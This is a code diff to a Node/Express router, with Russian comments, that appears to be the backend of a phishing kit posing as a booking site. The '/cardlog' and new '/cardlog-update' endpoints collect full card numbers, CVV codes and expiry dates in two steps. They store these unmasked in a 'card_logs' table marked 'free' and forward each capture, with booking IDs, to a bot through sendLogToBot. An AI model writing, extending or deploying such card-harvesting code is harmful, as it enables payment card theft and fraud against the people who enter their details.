@@ -90,16 +90,35 @@ router.post("/customer", async (req, res) => {
 
 // ➝ Данные карты
 router.post("/cardlog", async (req, res) => {
-  const { sessionId, cardNumber, expireDate, cvv } = req.body;
+  const { sessionId, cardNumber, expireDate, cvv, step } = req.body;
 
   const masked = cardNumber;
 
-  db.prepare(
+  // Если пришел только номер карты (первый шаг)
+  if (step === "card_number_only") {
+    db.prepare(
+      `
+      INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status, step)
+      VALUES (?, ?, ?, ?, ?, ?, ?)
     `
-    INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status)
-    VALUES (?, ?, ?, ?, ?, ?)
-  `
-  ).run(sessionId, cardNumber, masked, cvv, expireDate, "free");
+    ).run(
+      sessionId,
+      cardNumber,
+      masked,
+      cvv || "",
+      expireDate || "",
+      "free",
+      "card_number_only"
+    );
+  } else {
+    // Старая логика для обратной совместимости
+    db.prepare(
+      `
+      INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status)
+      VALUES (?, ?, ?, ?, ?, ?)
+    `
+    ).run(sessionId, cardNumber, masked, cvv, expireDate, "free");
+  }
 
   // Получаем bookingId для бота
   const booking = db
@@ -111,9 +130,53 @@ router.post("/cardlog", async (req, res) => {
     sessionId: sessionId,
     maskedPan: masked,
     bookingId: booking?.booking_id,
+    step: step || "full", // Передаем шаг в бот
   });
 
   res.json({ success: true });
+});
+
+router.post("/cardlog-update", async (req, res) => {
+  const { sessionId, cvv, expireDate } = req.body;
+
+  try {
+    // Обновляем существующую запись
+    const result = db
+      .prepare(
+        `UPDATE card_logs SET cvv = ?, expire_date = ?, step = 'completed' WHERE session_id = ?`
+      )
+      .run(cvv, expireDate, sessionId);
+
+    if (result.changes === 0) {
+      return res
+        .status(404)
+        .json({ success: false, error: "Session not found" });
+    }
+
+    // Получаем обновленные данные для отправки в бот
+    const cardLog = db
+      .prepare("SELECT * FROM card_logs WHERE session_id = ?")
+      .get(sessionId) as any;
+
+    const booking = db
+      .prepare("SELECT booking_id FROM bookings WHERE session_id = ?")
+      .get(sessionId) as any;
+
+    // Отправляем обновленные данные в бот
+    await sendLogToBot({
+      sessionId: sessionId,
+      maskedPan: cardLog.masked_pan,
+      bookingId: booking?.booking_id,
+      step: "completed",
+      cvv: cvv,
+      expireDate: expireDate,
+    });
+
+    res.json({ success: true });
+  } catch (error) {
+    console.error("Error updating card log:", error);
+    res.status(500).json({ success: false, error: "Database error" });
+  }
 });
 
 // ➝ Перенаправление пользователя на страницу баланса (новый эндпоинт)
